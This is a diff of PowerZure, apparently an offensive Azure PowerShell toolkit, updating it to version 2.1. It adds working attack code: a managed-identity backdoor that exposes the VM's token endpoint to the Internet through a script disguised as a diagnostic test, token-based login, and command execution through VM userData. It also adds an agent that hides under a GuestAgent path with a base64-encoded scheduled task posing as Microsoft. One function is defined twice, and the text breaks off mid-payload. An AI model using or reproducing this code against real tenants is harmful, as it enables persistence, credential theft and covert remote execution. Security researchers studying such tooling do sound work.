@@ -1,12 +1,11 @@
 ﻿Set-ExecutionPolicy Bypass
+Set-Item Env:\SuppressAzurePowerShellBreakingChangeWarnings "true"
 
 function Get-AzureGraphToken
 {
-    $APSUser = Get-AzContext *>&1 
-    $resource = "https://graph.microsoft.com"
-    $Token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($APSUser.Account, $APSUser.Environment, $APSUser.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, $resource).AccessToken
+    $token = Get-AzAccessToken -ResourceTypeName MSGraph
     $Headers = @{}
-    $Headers.Add("Authorization","Bearer"+ " " + "$($token)")    
+    $Headers.Add("Authorization","Bearer"+ " " + "$($token.token)")    
     $Headers
 }
 
@@ -15,8 +14,8 @@ function Connect-AADUser {
     catch{"Error"}
     If($ConnectionTest -eq 'Error'){ 
     $context = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile.DefaultContext
-	$aadToken = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($context.Account, $context.Environment, $context.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, "https://graph.windows.net").AccessToken
-    Connect-AzureAD -AadAccessToken $aadToken -AccountId $context.Account.Id -TenantId $context.tenant.id}
+	$token = Get-AzAccessToken -ResourceTypeName AadGraph
+    Connect-AzureAD -AadAccessToken $token.token -AccountId $context.Account.Id -TenantId $context.tenant.id}
 }
 
 function Show-AzureCurrentUser
@@ -27,7 +26,7 @@ function Show-AzureCurrentUser
      {         						  
         $Headers = Get-AzureGraphToken 
         $Login = Connect-AADUser			  
-		$obj = New-Object -TypeName psobject
+		$obj = New-Object -TypeName psobject 
 		$username = $APSUser.Account
         If($APSUser.Subscription){
         $activesub = $APSUser.Subscription.Name + ' (' + $APSUser.Subscription.Id + ')'
@@ -92,8 +91,7 @@ function Invoke-PowerZure
     Param(
     [Parameter(Mandatory=$false)][switch]$h = $null,
     [Parameter(Mandatory=$false)][switch]$Checks = $null,
-    [Parameter(Mandatory=$false)][switch]$Banner = $null,
-    [Parameter(Mandatory=$false)][switch]$Welcome = $null)
+    [Parameter(Mandatory=$false)][switch]$Banner = $null)
 
     If($Checks)
     {
@@ -127,7 +125,7 @@ function Invoke-PowerZure
                     Exit
 	            }
             }
-            if ($Modules.Name -notcontains 'AzureADPreview'){
+            if ($Modules.Name -notcontains 'AzureAD'){
 	            Write-host "Install AzureAD PowerShell Module?" -ForegroundColor Yellow 
                 $Readhost = Read-Host " ( y / n ) " 
                 if ($ReadHost -eq 'y' -or $Readhost -eq 'yes') 
@@ -161,7 +159,7 @@ function Invoke-PowerZure
     {
             Write-Host @"
 			
-			  PowerZure Version 2.0
+			  PowerZure Version 2.1
 
 				List of Functions              
 
@@ -170,7 +168,7 @@ function Invoke-PowerZure
 Get-AzureADRole -------------------- Gets the members of one or all Azure AD role. Roles does not mean groups.
 Get-AzureAppOwner ----------------- Returns all owners of all Applications in AAD
 Get-AzureDeviceOwner -------------- Lists the owners of devices in AAD. This will only show devices that have an owner.
-Get-AzureGroup --------------------- Gathers a specific group or all groups in AzureAD and lists their members.
+Get-AzureADGroup --------------------- Gathers a specific group or all groups in AzureAD and lists their members.
 Get-AzureIntuneScript -------------- Lists available Intune scripts in Azure Intune
 Get-AzureLogicAppConnector --------- Lists the connector APIs in Azure
 Get-AzureRole ---------------------- Gets the members of an Azure RBAC role.
@@ -189,6 +187,7 @@ Add-AzureADGroup ---------------- Adds a user to an Azure AD Group
 Add-AzureADRole ----------------- Assigns a specific Azure AD role to a User
 Add-AzureSPSecret --------------- Adds a secret to a service principal
 Add-AzureRole ------------------- Adds a role to a user in Azure
+Connect-AzureJWT ---------------- Logins to Azure using a JWT access token. 
 New-AzureBackdoor --------------- Creates a backdoor in Azure via Service Principal
 Export-AzureKeyVaultContent ----- Exports a Key as PEM or Certificate as PFX from the Key Vault
 Get-AzureKeyVaultContent -------- Get the secrets and certificates from a specific Key Vault or all of them
@@ -197,51 +196,55 @@ Get-AzureRunbookContent --------- Gets a specific Runbook and displays its conte
 Get-AzureStorageContent --------- Gathers a file from a specific blob or File Share
 Get-AzureVMDisk ----------------- Generates a link to download a Virtual Machiche’s disk. The link is only available for 24 hours.
 Invoke-AzureCommandRunbook ------ Will execute a supplied command or script from a Runbook if the Runbook is configured with a “RunAs” account
+Invoke-AzureMIBackdoor ---------- Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.
 Invoke-AzureRunCommand ---------- Will run a command or script on a specified VM
 Invoke-AzureRunMSBuild ---------- Will run a supplied MSBuild payload on a specified VM. 
 Invoke-AzureRunProgram ---------- Will run a given binary on a specified VM
+Invoke-AzureVMUserDataAgent ----- Deploys the agent used by Invoke-AzureVMUserDataCommand
+Invoke-AzureVMUserDataCommand --- Executes a command using the userData channel on a specified Azure VM.
 New-AzureUser ------------------- Creates a user in Azure Active Directory
 New-AzureIntuneScript ----------- Uploads a PS script to Intune
 Set-AzureElevatedPrivileges ----- Elevates the user’s privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
 Set-AzureSubscription ----------- Sets default subscription. Necessary if in a tenant with multiple subscriptions.
 Set-AzureUserPassword ----------- Sets a user’s password
 Start-AzureRunbook -------------- Starts a Runbook	
-
 "@
-
         }
     if($Banner)
     {
 Write-Host @' 
-                                                                                                                   
-8888888b.                                              8888888888P                           
-888   Y88b    ________                                       d88P                            
-888    888  /\  ___   \                                     d88P                             
-888   d88P /  \/   \   \ 888  888  888  .d88b.  888d888   d88P    888  888 888d888  .d88b.  
-8888888P"     | # # |    888  888  888 d8P  Y8b 888P"    d88P     888  888 888P"   d8P  Y8b 
-888        |  |     |\ | 888  888  888 88888888 888     d88P      888  888 888     88888888 
-888            \_ _/  \  Y88b 888 d88P Y8b.     888    d88P       Y88b 888 888     Y8b.     
-888         \_________/   "Y8888888P"   "Y8888  888   d8888888888  "Y88888 888      "Y8888    version 2.0                                                                                                                  
- 
-'@ -ForegroundColor Magenta
+8888888b.                                                 ,/	8888888888P                           
+888   Y88b                                              ,'/           d88P       
+888    888                                            ,' /           d88P    
+888   d88P  .d88b.  888  888  888  .d88b.  888d888  ,'  /____       d88P    888  888 888d888  .d88b.  
+8888888P"  d88""88b 888  888  888 d8P  Y8b 888P"  .'____    ,'     d88P     888  888 888P"   d8P  Y8b   
+888        888  888 888  888  888 88888888 888         /  ,'      d88P      888  888 888     88888888 
+888        Y88..88P Y88b 888 d88P Y8b.     888        / ,'       d88P       Y88b 888 888     Y8b.   
+888         "Y88P"   "Y8888888P"   "Y8888  888       /,'        d8888888888  "Y88888 888      "Y8888  version 2.1
+                                                    /'                                                													
+'@ -ForegroundColor Cyan
 
-            Write-Host 'Confused on what to do next? Check out the documentation: https://powerzure.readthedocs.io/ or type Invoke-Powerzure -h for a function table.' -ForegroundColor yellow
+            Write-Host 'Confused on what to do next? Check out the documentation: ' -ForegroundColor yellow -NoNewline
+            Write-Host 'https://powerzure.readthedocs.io/ ' -ForegroundColor Blue -NoNewline
+            Write-Host 'or type ' -ForegroundColor yellow -NoNewline
+            Write-Host 'Invoke-Powerzure -h ' -ForegroundColor Magenta -NoNewline
+            Write-Host 'for a function table.' -ForegroundColor yellow 
             Write-Host ""
+            Write-Host 'Please set your default subscription with ' -ForegroundColor yellow -NoNewline 
+            Write-Host 'Set-AzureSubscription ' -ForegroundColor Magenta -NoNewline
+            Write-Host 'if you have multiple subscriptions. Functions WILL fail if you do not do this. Use '  -ForegroundColor yellow -NoNewline 
+            Write-Host 'Show-AzureCurrentUser' -ForegroundColor Magenta -NoNewline
+			Write-Host ' to get list your accounts roles & permissions'-ForegroundColor Yellow
+   		
     }
-    if($Welcome)
-    {
-            Show-AzureCurrentUser
-            Write-Host ""
-            Write-Host "Please set your default subscription with 'Set-AzureSubscription -Id {id} if you have multiple subscriptions. Functions WILL fail if you do not do this. Use Show-AzureCurrentUser to get a list of Subscriptions." -ForegroundColor Yellow
-		
-    }
-        if(!$Welcome -and !$Checks -and !$h)
-            {
-	            Write-Host "Please login with Connect-AzAccount" -ForegroundColor Red
-            }            
+
+	if(!$Checks -and !$h)
+		{
+			Write-Host "Please login with Connect-AzAccount" -ForegroundColor Red
+		}            
 }
 
-Invoke-PowerZure -Checks -Banner -Welcome 
+Invoke-PowerZure -Checks -Banner
 
 function Set-AzureSubscription
 {
@@ -256,8 +259,18 @@ function Set-AzureSubscription
 
     [CmdletBinding()]
     Param(
-    [Parameter(Mandatory=$true,HelpMessage='Enter a subscription ID. Try Show-AzureCurrentUser to see a list of subscriptions')][String]$Id = $null) 
-	Set-AzContext -SubscriptionId $Id
+    [Parameter(Mandatory=$false,HelpMessage='Enter a subscription ID. Try Show-AzureCurrentUser to see a list of subscriptions')][String]$Id = $null) 
+    $subs = Get-AzSubscription	
+    Write-Host "Select a subscription to choose as the default subscription:" -ForegroundColor Yellow
+    Write-Host "" 
+    $i=1
+    ForEach ($sub in $subs){
+    Write-Host "[$i]"- $sub.name 
+    $i++}
+    Write-Host ""
+    $main = Read-Host "Please select a number: "  
+    $choice = $subs[$main-1]
+    Set-AzContext -SubscriptionId $choice.Id
 }
 
 function Get-AzureADRole
@@ -317,7 +330,7 @@ function Get-AzureADRole
         Write-Host "Usage:" -ForegroundColor Red
         Write-Host "Get-AzureADRoleMember -Role '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
         Write-Host "Get-AzureADRoleMember -All" -ForegroundColor Red
-        Write-Host "Get-AzureADRoleMember -Role 'Company Administrator'" -ForegroundColor Red
+        Write-Host "Get-AzureADRoleMember -Role 'Global Administrator'" -ForegroundColor Red
 
     }
 }
@@ -421,7 +434,7 @@ function Get-AzureUser
     
 }
 
-function Get-AzureGroup 
+function Get-AzureADGroup 
 {
 <# 
 .SYNOPSIS
@@ -432,30 +445,33 @@ function Get-AzureGroup
 	-All (List all group members of all groups)
 
 .EXAMPLE
-	Get-AzureGroup -Group 'Sql Admins'
-	Get-AzureGroup -All 
+	Get-AzureADGroup -Group 'Sql Admins'
+	Get-AzureADGroup -All 
 #>
     [CmdletBinding()]
     Param(
 	[Parameter(Mandatory=$false,HelpMessage='Group name')][String]$Group = $null,
-	[Parameter(Mandatory=$false)][Switch]$All = $null)
-
+	[Parameter(Mandatory=$false)][Switch]$All = $false)
+    Connect-AADUser
 	If($All)
 	{
 		Write-Host ""
 		$groups=Get-AzADGroup
 		ForEach ($g in $groups)
 		{
+            $obj = New-Object -TypeName psobject
+			$obj | Add-Member -MemberType NoteProperty -Name GroupName -Value $g.displayname
+			$obj | Add-Member -MemberType NoteProperty -Name GroupId -Value $g.Id
+			$obj | Add-Member -MemberType NoteProperty -Name MemberName -Value ''
+			$obj | Add-Member -MemberType NoteProperty -Name MemberId -Value ''         
 			$members = Get-AzADGroupMember -GroupObjectId $g.id 
 			ForEach ($member in $members)
 			{ 
-			$obj = New-Object -TypeName psobject
-			$obj | Add-Member -MemberType NoteProperty -Name GroupName -Value $g.displayname
-			$obj | Add-Member -MemberType NoteProperty -Name GroupId -Value $g.Id
-			$obj | Add-Member -MemberType NoteProperty -Name MemberName -Value $member.userPrincipalName
-			$obj | Add-Member -MemberType NoteProperty -Name MemberId -Value $member.Id		
-			$obj
+			    $obj | Add-Member -MemberType NoteProperty -Name MemberName -Value $member.userPrincipalName -Force
+			    $obj | Add-Member -MemberType NoteProperty -Name MemberId -Value $member.Id -Force
+                				
 			}
+            $obj
 		} 
 	}
 	If($group)
@@ -562,13 +578,12 @@ function Get-AzureTargets
     Checks your role against the scope of your role to determine what you have access to. 
 #>
     $Connect = Connect-AADUser
-    $ConnectAAD = Connect-AADUser
     $Context = Get-AzContext
     $Headers = Get-AzureGraphToken
     $user = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/me'
     $userid=$user.id
-    $aadroles = Get-AzureADUserMembership -ObjectId $userid
     $Memberships = Get-AzureADUserMembership -ObjectId $userid
+    $aadroles = Get-AzureADUserMembership -ObjectId $userid
     $Groups = @()
     $AADRoles = @()
     $AADRolesDetailed = @()
@@ -581,8 +596,8 @@ function Get-AzureTargets
         $AADRolesDetailed += $Membership
         }
     }           
-	try{$rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1}catch{}
-    Write-Host "Your AzureAD Roles:" -ForegroundColor Yellow
+	
+    Write-Host "AzureAD Roles:" -ForegroundColor Magenta
     Write-Host ""
     ForEach ($aadrole in $AADRolesDetailed){
     $aadrolename = $aadrole.DisplayName
@@ -591,13 +606,14 @@ function Get-AzureTargets
     Write-Host " - $aadroledescription"
     }
     Write-Host ""
-    Write-Host "Your Azure Resources Roles:" -ForegroundColor Yellow
+    Write-Host "Azure RBAC Roles:" -ForegroundColor Magenta
     Write-Host ""
+    try{$rbacroles = Get-AzRoleAssignment -ObjectId $userid *>&1}catch{}
     If($rbacroles){    
         $resources = Get-AzResource                                  
         ForEach ($rbacrole in $rbacroles){           
             $rolename = $rbacrole.RoleDefinitionName
-            $roledef = Get-AzRoleDefinition -Name $rbacrole.RoleDefinitionName
+            $roledef = Get-AzRoleDefinition -Name $rolename
             $roledesc = $roledef.Description
             $rolescope = $rbacrole.scope
             Write-Host "$rolename" -ForegroundColor Green -NoNewline
@@ -1521,6 +1537,7 @@ Get-AzureRunAsAccounts
 
     $obj = New-Object -TypeName psobject		 	
     $apps = Get-AzADApplication | Where-Object {$_.HomePage -Match 'automationAccounts'}
+    If($apps){
 	$name = $apps.DisplayName.Split("_")[0]
 	$aa = Get-AzAutomationAccount | Where-object {$_.AutomationAccountName -match $name}
 	$aaname = $aa.AutomationAccountName
@@ -1531,7 +1548,10 @@ Get-AzureRunAsAccounts
     $obj | Add-Member -MemberType NoteProperty -Name ApplicationId -Value $apps.ApplicationId
     $obj | Add-Member -MemberType NoteProperty -Name ServicePrincipalName -Value $sps.DisplayName
     $obj | Add-Member -MemberType NoteProperty -Name ServicePrincipalId -Value $sps.Id
-    $obj
+    $obj}
+    else{
+    Write-Host "No RunAs Accounts found" -ForegroundColor yellow
+    }
 }
 
 function Get-AzureAppOwner
@@ -1849,4 +1869,271 @@ function Get-AzureDeviceOwner
             $AzureDeviceOwner
         }       
 	}
+}
+
+function Invoke-AzureMIBackdoor
+{
+<# 
+.SYNOPSIS
+    Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.
+
+.PARAMETERS
+	-VM (Name of VM)
+	-Scope (Scope of the role)
+	-Role (Role to apply over the supplied scope)
+	
+.EXAMPLE
+	Invoke-AzureMIBackdoor -VM Win10 -Role Contributor -Scope '/subscriptions/fa2cd1e3-abcd-efghi-jlmnop-0c81f66381d5/'
+#>	
+	$vmobj = Get-AzVM -Name $VM
+	$rg = $vm.ResourceGroupName
+	Write-Host "Creating Managed Identity Service Principal..." -ForegroundColor Yellow
+	$add = Update-AzVM -ResourceGroupName $rg -VM $vm -IdentityType SystemAssigned
+	$sp = Get-AzADServicePrincipal -displayname $vm.name
+	$id = $sp.id
+	$AID = $sp.applicationid
+	$roleadd = New-AzRoleAssignment -ObjectId $id -RoleDefinitionName $role -Scope $scope
+	If($roleadd.RoleDefinitionName -eq $role){
+		$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
+		$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
+		$path = $new.DirectoryName + '\' + $new.Name 
+		$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
+		$result.value.Message
+		rm $path
+	}
+}
+function Invoke-AzureMIBackdoor
+{
+<# 
+.SYNOPSIS
+    Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.
+
+.PARAMETERS
+	-VM (Name of VM)
+	-Scope (Scope of the role)
+	-Role (Role to apply over the supplied scope)
+	-NoRDP (Open up port 80 on the NSG to avoid using 3389)
+	
+.EXAMPLE
+	Invoke-AzureMIBackdoor -VM Win10 -Role Contributor -Scope '/subscriptions/fa2cd1e3-abcd-efghi-jlmnop-0c81f66381d5/'
+#>	
+    [CmdletBinding()]
+    Param(
+	[Parameter(Mandatory=$true)][String]$VM = $null,
+	[Parameter(Mandatory=$false)][Switch]$NoRDP = $false,
+	[Parameter(Mandatory=$true)][String]$Scope = $null,
+	[Parameter(Mandatory=$true)][String]$Role = $null)
+
+	$vmobj = Get-AzVM -Name $VM
+	$rg = $vmobj.ResourceGroupName
+	Write-Host "Creating Managed Identity Service Principal..." -ForegroundColor Yellow
+	$add = Update-AzVM -ResourceGroupName $rg -VM $vmobj -IdentityType SystemAssigned
+	$sp = Get-AzADServicePrincipal -displayname $vm
+	If($sp){
+		Write-Host "Created Managed Identity Service Principal $vm!" -ForegroundColor Green
+	}
+	$id = $sp.id	
+	$roleadd = New-AzRoleAssignment -ObjectId $id -RoleDefinitionName $role -Scope $scope
+	If($roleadd){
+		If($NoRDP){
+			$NSG = Get-AzNetworkSecurityGroup -Name $VM*
+			Add-AzNetworkSecurityRuleConfig -Access Allow -DestinationAddressPrefix * -DestinationPortRange 80 -Direction Inbound -Name HTTP -Priority 101 -Protocol Tcp -SourceAddressPrefix 'Internet' -SourcePortRange * -NetworkSecurityGroup $NSG | Set-AzNetworkSecurityGroup
+			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=80 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
+			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
+			$path = $new.DirectoryName + '\' + $new.Name 
+			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
+			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
+			rm $path
+			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
+				$name = $VM + '*-ip'
+				$ipobj =  Get-AzPublicIpAddress -Name $name
+				$ip = $ipobj.ipaddress
+				$uri = 'http://' + $ip +'/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
+				$request =  "Invoke-WebRequest -Uri '" + $uri + "' -Method GET -Headers @{Metadata='true'}"
+				Write-Host "Successfully modified port proxy rule. You can request the JWT for $vm Service Principal at:" -ForegroundColor Green
+				Write-Host $request
+				$prompt = Read-Host "Login with JWT Now? [Y]/[N]"
+				If($prompt -eq 'Y' -or $prompt -eq 'Yes'){
+						$requestdata = Invoke-WebRequest -Uri $uri -Method GET -Headers @{Metadata='true'}
+						$tokendata = $requestdata.Content
+						Connect-AzureJWT -Token $tokendata -AccountID $id -Raw
+					}	
+				}			
+			}	
+		else{
+			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
+			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
+			$path = $new.DirectoryName + '\' + $new.Name 
+			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
+			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
+			rm $path
+			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
+			$name = $VM + '*-ip'
+			$ipobj =  Get-AzPublicIpAddress -Name $name
+			$ip = $ipobj.ipaddress
+			$uri = 'http://' + $ip +':3389/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
+			$request =  "Invoke-WebRequest -Uri '" + $uri + "' -Method GET -Headers @{Metadata='true'}"
+			Write-Host "Successfully modified port proxy rule. You can request the JWT for $vm Service Principal at:" -ForegroundColor Green
+			Write-Host $request
+			$prompt = Read-Host "Login with JWT Now? [Y]/[N]"
+			If($prompt -eq 'Y' -or $prompt -eq 'Yes'){
+					$requestdata = Invoke-WebRequest -Uri $uri -Method GET -Headers @{Metadata='true'}
+					$tokendata = $requestdata.Content
+					Connect-AzureJWT -Token $tokendata -AccountID $id -Raw
+				}	
+			}		
+		}
+	}
+}
+
+function Connect-AzureJWT
+<# 
+.SYNOPSIS
+    Logins to Azure using a JWT access token. Use -Raw to supply an unstructured token from a Managed Identity token request.
+
+.PARAMETERS
+	-Token (Access token)
+	-AccountID (Account's ID in AzureAD. This will not be the Application ID in the case for Service Principals but the actual account ID.)
+	-Raw (This will convert a REST API response to a token when gathering a token from a Managed Identity.)
+	
+.EXAMPLE
+	$token = 'eyJ0eXAiOiJKV1QiLC....(snip)'
+	Connect-AzureJWT -Token $token -AccountId 93f7295a-1243-1234-1234-1a1fa41560e8
+	
+	Connect-AzureJWT -Token $token -AccountId 93f7295a-678e-44d2-b705-1a1fa41560e8 -Raw
+#>	
+{
+    [CmdletBinding()]
+    Param(
+	[Parameter(Mandatory=$true)][String]$Token = $null,
+	[Parameter(Mandatory=$true)][String]$AccountID = $null,
+	[Parameter(Mandatory=$False)][Switch]$Raw = $false)
+		
+	If($Raw)
+	{
+	$content = $Token | ConvertFrom-Json	
+	$ArmToken = $content.access_token	
+	Connect-AzAccount -AccessToken $ArmToken -AccountId $AccountID
+	}
+	else{
+	Connect-AzAccount -AccessToken $Token -AccountId $AccountID
+	}
+}
+
+function Get-AzureManagedIdentities
+<# 
+.SYNOPSIS
+    Gathers all Managed Identities and lists their role & scope.
+#>
+{
+	$Headers = Get-AzureGraphToken 
+	$Login = Connect-AADUser
+	$MIs = Get-AzADServicePrincipal | where-object {$_.ServicePrincipalNames -match 'https://identity.azure.net'}
+	ForEach ($MI in $MIs){
+		$id = $MI.id
+		$uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter=principalId' +' eq ' + "'" + $id + "'"
+		$user = Invoke-RestMethod -Headers $Headers -Uri $uri
+		$userdata = $user.value
+		$roledefid = $userdata.roleDefinitionId
+		$roledata = Invoke-RestMethod -Headers $Headers -Uri https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$roledefid
+		$rolename = $roledata.displayName
+		$RA = Get-AzRoleAssignment -ObjectId $MI.Id
+		$Obj = [PSCustomObject]@{
+		ManagedIdentityName = $MI.Displayname
+		AzRoleAssignment = $RA.RoleDefinitionName
+		AzScope = $RA.Scope
+		AzADRoleAssignment = $rolename
+		AzADScope = $userdata.resourceScope
+		}
+		$Obj | fl
+	}
+}
+
+function Invoke-AzureVMUserDataCommand
+{
+<# 
+.SYNOPSIS
+    Executes a command using the userData channel on a specified Azure VM.
+
+.PARAMETERS
+	-Command (Command to run)
+	-VM (Virtual machine name)
+	
+.EXAMPLE
+	Invoke-AzureVMUserDataCommand -VM Windows10 -Command ls
+#>	
+    [CmdletBinding()]
+    Param(
+    [Parameter(Mandatory=$true)][String]$Command = $null,
+    [Parameter(Mandatory=$true)][String]$VM = $null)
+	$Command
+	$token = Get-AzAccessToken
+	$Resource = Get-AzResource -Name $VM
+	$ResourceID = $Resource.ResourceId
+	$Headers = @{}
+    $Headers.Add("Authorization","Bearer"+ " " + "$($token.token)") 
+	$FullCommand = $Command + '%' + $token.token + '%' + $ResourceID
+	$Bytes = [System.Text.Encoding]::Unicode.GetBytes($FullCommand)
+	$EncodedText =[Convert]::ToBase64String($Bytes)
+	$json = '{"properties": { "userData": ' + '"' + $EncodedText + '",	}}'
+	$Uri = 'https://management.azure.com/' + $ResourceID + '?api-version=2021-07-01'
+	$RestMethod = Invoke-RestMethod -Method PATCH -Uri $uri -Body $Json -Header $Headers -ContentType 'application/json'
+	Start-Sleep 60
+	$Uri = 'https://management.azure.com/' + $ResourceID + '?$expand=userdata&api-version=2021-07-01'
+	$RestMethod = Invoke-RestMethod -Method GET -Uri $uri -Header $Headers
+	$userdata = $RestMethod.properties.userData
+	[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($userdata))
+}
+
+function Invoke-AzureVMUserDataAgent
+{
+<# 
+.SYNOPSIS
+    Deploys the agent used by Invoke-AzureVMUserDataCommand
+
+.PARAMETERS
+
+	-VM (Virtual machine name)
+	
+.EXAMPLE
+	Invoke-AzureVMUserDataAgent -VM Win10
+#>	
+    [CmdletBinding()]
+    Param(
+    [Parameter(Mandatory=$true)][String]$VM = $null)
+	$vmobj = Get-AzVM -Name $VM
+	$rg = $vmobj.ResourceGroupName
+	$data = @'
+$ErrorActionPreference= 'silentlycontinue'
+If('C:\WindowsAzure\Packages\GuestAgent\AzureInstanceMetadataService.ps1'){Copy-Item -Path $PSCommandPath -Destination 'C:\WindowsAzure\Packages\GuestAgent\AzureInstanceMetadataService.ps1'
+}
+$task = 'PAA/AHgAbQBsACAAdgBlAHIAcwBpAG8AbgA9ACIAMQAuADAAIgAgAGUAbgBjAG8AZABpAG4AZwA9ACIAVQBUAEYALQAxADYAIgA/AD4ACgA8AFQAYQBzAGsAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4ANAAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AdwBpAG4AZABvAHcAcwAvADIAMAAwADQALwAwADIALwBtAGkAdAAvAHQAYQBzAGsAIgA+AAoAIAAgADwAUgBlAGcAaQBzAHQAcgBhAHQAaQBvAG4ASQBuAGYAbwA+AAoAIAAgACAAIAA8AEQAYQB0AGUAPgAyADAAMgAxAC0AMQAyAC0AMAAyAFQAMgAxADoAMwAxADoAMgAyAC4AMwAxADcAMgA0ADIANQA8AC8ARABhAHQAZQA+AAoAIAAgACAAIAA8AEEAdQB0AGgAbwByAD4ATQBpAGMAcgBvAHMAbwBmAHQAIABDAG8AcgBwAG8AcgBhAHQAaQBvAG4APAAvAEEAdQB0AGgAbwByAD4ACgAgACAAIAAgADwAVQBSAEkAPgBcAEEAegB1AHIAZQAgAEkAbgBzAHQAYQBuAGMAZQAgAE0AZQB0AGEAZABhAHQAYQAgAFMAZQByAHYAaQBjAGUAIABRAHUAZQByAHkAPAAvAFUAUgBJAD4ACgAgACAAPAAvAFIAZQBnAGkAcwB0AHIAYQB0AGkAbwBuAEkAbgBmAG8APgAKACAAIAA8AFQAcgBpAGcAZwBlAHIAcwA+AAoAIAAgACAAIAA8AEUAdgBlAG4AdABUAHIAaQBnAGcAZQByAD4ACgAgACAAIAAgACAAIAA8AEUAeABlAGMAdQB0AGkAbwBuAFQAaQBtAGUATABpAG0AaQB0AD4AUABUADUATQA8AC8ARQB4AGUAYwB1AHQAaQBvAG4AVABpAG0AZQBMAGkAbQBpAHQAPgAKACAAIAAgACAAIAAgADwARQBuAGEAYgBsAGUAZAA+AHQAcgB1AGUAPAAvAEUAbgBhAGIAbABlAGQAPgAKACAAIAAgACAAIAAgADwAUwB1AGIAcwBjAHIAaQBwAHQAaQBvAG4APgAmAGwAdAA7AFEAdQBlAHIAeQBMAGkAcwB0ACYAZwB0ADsAJgBsAHQAOwBRAHUAZQByAHkAIABJAGQAPQAiADAAIgAgAFAAYQB0AGgAPQAiAE0AaQBjAHIAbwBzAG8AZgB0AC0AVwBpAG4AZABvAHcAcwBBAHoAdQByAGUALQBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALwBHAHUAZQBzAHQAQQBnAGUAbgB0ACIAJgBnAHQAOwAmAGwAdAA7AFMAZQBsAGUAYwB0ACAAUABhAHQAaAA9ACIATQBpAGMAcgBvAHMAbwBmAHQALQBXAGkAbgBkAG8AdwBzAEEAegB1AHIAZQAtAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAvAEcAdQBlAHMAdABBAGcAZQBuAHQAIgAmAGcAdAA7ACoAWwBTAHkAcwB0AGUAbQBbAFAAcgBvAHYAaQBkAGUAcgBbAEAATgBhAG0AZQA9ACcAVwBpAG4AZABvAHcAcwBBAHoAdQByAGUALQBHAHUAZQBzAHQAQQBnAGUAbgB0AC0ATQBlAHQAcgBpAGMAcwAnAF0AIABhAG4AZAAgAEUAdgBlAG4AdABJAEQAPQA3AF0AXQAmAGwAdAA7AC8AUwBlAGwAZQBjAHQAJgBnAHQAOwAmAGwAdAA7AC8AUQB1AGUAcgB5ACYAZwB0ADsAJgBsAHQAOwAvAFEAdQBlAHIAeQBMAGkAcwB0ACYAZwB0ADsAPAAvAFMAdQBiAHMAYwByAGkAcAB0AGkAbwBuAD4ACgAgACAAIAAgADwALwBFAHYAZQBuAHQAVAByAGkAZwBnAGUAcgA+AAoAIAAgACAAIAA8AFIAZQBnAGkAcwB0AHIAYQB0AGkAbwBuAFQAcgBpAGcAZwBlAHIAPgAKACAAIAAgACAAIAAgADwARQBuAGEAYgBsAGUAZAA+AHQAcgB1AGUAPAAvAEUAbgBhAGIAbABlAGQAPgAKACAAIAAgACAAPAAvAFIAZQBnAGkAcwB0AHIAYQB0AGkAbwBuAFQAcgBpAGcAZwBlAHIAPgAKACAAIAA8AC8AVAByAGkAZwBnAGUAcgBzAD4ACgAgACAAPABQAHIAaQBuAGMAaQBwAGEAbABzAD4ACgAgACAAIAAgADwAUAByAGkAbgBjAGkAcABhAGwAIABpAGQAPQAiAEEAdQB0AGgAbwByACIAPgAKACAAIAAgACAAIAAgADwAVQ